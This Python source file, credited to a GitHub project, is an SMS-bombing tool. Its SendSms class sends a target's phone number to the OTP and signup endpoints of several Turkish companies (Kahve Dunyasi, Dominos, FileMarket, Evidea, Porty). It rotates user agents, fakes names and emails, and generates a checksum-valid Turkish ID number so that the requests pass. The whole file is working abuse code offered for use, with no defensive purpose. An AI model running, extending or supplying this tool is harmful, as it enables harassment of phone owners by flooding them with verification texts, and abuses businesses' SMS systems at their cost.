import requests
from random import choice, randint
from string import ascii_lowercase, digits
from colorama import Fore, Style
import time

#Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
]

MAIL_DOMAINS = [
    "@gmail.com", "@outlook.com", "@hotmail.com", "@yahoo.com",
    "@protonmail.com", "@icloud.com", "@yandex.com", "@mail.com",
    "@gmail.com", "@outlook.com",
]


def _rand_mail():
    length = randint(8, 18)
    name = ''.join(choice(ascii_lowercase + digits) for _ in range(length))
    return name + choice(MAIL_DOMAINS)


def _rand_name():
    isimler = ["Ahmet", "Mehmet", "Ali", "Veli", "Kemal", "Osman", "Yusuf",
               "Hasan", "Murat", "Emre", "Can", "Omer", "Burak", "Serkan"]
    soyisimler = ["Yilmaz", "Kaya", "Demir", "Sahin", "Celik", "Aydin",
                  "Ozturk", "Arslan", "Dogan", "Kilic", "Polat", "Yildiz"]
    return choice(isimler), choice(soyisimler)


class SendSms:
    def __init__(self, phone, mail):
        self.adet = 0
        rakam = [randint(1, 9)]
        for _ in range(8):
            rakam.append(randint(0, 9))
        rakam.append(((rakam[0]+rakam[2]+rakam[4]+rakam[6]+rakam[8])*7 - (rakam[1]+rakam[3]+rakam[5]+rakam[7])) % 10)
        rakam.append(sum(rakam[:10]) % 10)
        self.tc = "".join(str(r) for r in rakam)
        self.phone = str(phone)
        self.mail = mail if (mail and "@" in mail) else _rand_mail()

    def _get_ua(self):
        return choice(USER_AGENTS)

    def _ok(self, name):
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}SMS Gonderildi! {self.phone} --> {name}")
        self.adet += 1

    def _err(self, name, msg):
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gonderilemedi!  {self.phone} --> {name} ({msg})")

    def _retry(self, fn, name, retries=2):
        for attempt in range(retries + 1):
            try:
                result = fn()
                if result:
                    return True
            except Exception:
                pass
            if attempt < retries:
                time.sleep(0.5)
        self._err(name, "max retry")
        return False

    # ================================================================
    # ====================  SMS SERVİSLERİ  ==========================
    # ================================================================

    def KahveDunyasi(self):
        def _try():
            r = requests.post(
                "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json",
                         "X-Language-Id": "tr-TR", "X-Client-Platform": "web",
                         "Origin": "https://www.kahvedunyasi.com", "Referer": "https://www.kahvedunyasi.com/"},
                json={"countryCode": "90", "phoneNumber": self.phone},
                timeout=8
            )
            if r.status_code in (200, 201) and r.json().get("processStatus") == "Success":
                self._ok("KahveDunyasi"); return True
            return False
        self._retry(_try, "KahveDunyasi")

    def Dominos(self):
        def _try():
            r = requests.post(
                "https://frontend.dominos.com.tr/api/customer/sendOtpCode",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json;charset=utf-8",
                         "Accept": "application/json", "Servicetype": "CarryOut",
                         "Locationcode": "undefined", "Appversion": "IOS-7.1.0"},
                json={"email": _rand_mail(), "isSure": False, "mobilePhone": self.phone},
                timeout=8
            )
            if r.status_code in (200, 201) and r.json().get("isSuccess"):
                self._ok("Dominos"); return True
            return False
        self._retry(_try, "Dominos")

    def File(self):
        def _try():
            r = requests.post(
                "https://api.filemarket.com.tr/v1/otp/send",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json",
                         "X-Os": "IOS", "X-Version": "1.7"},
                json={"mobilePhoneNumber": f"90{self.phone}"},
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("FileMarket"); return True
            return False
        self._retry(_try, "FileMarket")

    def Evidea(self):
        def _try():
            boundary = "EvideaFormBound2026"
            ad, soyad = _rand_name()
            data = (
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\n{ad}\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\n{soyad}\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{_rand_mail()}\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\nAbc_123!xyz\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n"
                f"--{boundary}--\r\n"
            )
            r = requests.post("https://www.evidea.com/users/register/",
                headers={"User-Agent": self._get_ua(),
                         "Content-Type": f"multipart/form-data; boundary={boundary}",
                         "X-App-Type": "akinon-mobile", "X-App-Device": "ios",
                         "Accept": "application/json", "Referer": "https://www.evidea.com/"},
                data=data, timeout=8)
            if r.status_code in (200, 201, 202):
                self._ok("Evidea"); return True
            return False
        self._retry(_try, "Evidea")

    def Porty(self):
        def _try():
            r = requests.post(
                "https://panel.porty.tech/api.php",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json"},
                json={"job": "start_login", "phone": self.phone},
                timeout=10
            )
            if r.status_code == 200:
                self._ok("Porty"); return True
            return False
        self._retry(_try, "Porty")

#Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.
